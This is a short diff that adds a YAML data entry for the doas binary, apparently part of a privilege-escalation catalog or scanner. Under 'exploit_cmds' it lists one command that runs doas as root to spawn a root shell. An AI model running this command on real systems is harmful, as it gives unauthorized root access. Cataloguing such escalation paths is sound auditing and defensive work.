@@ -1,0 +1,4 @@
+name: doas
+binary_path: /usr/bin/doas
+exploit_cmds:
+- sudo /usr/bin/doas -u root /bin/sh
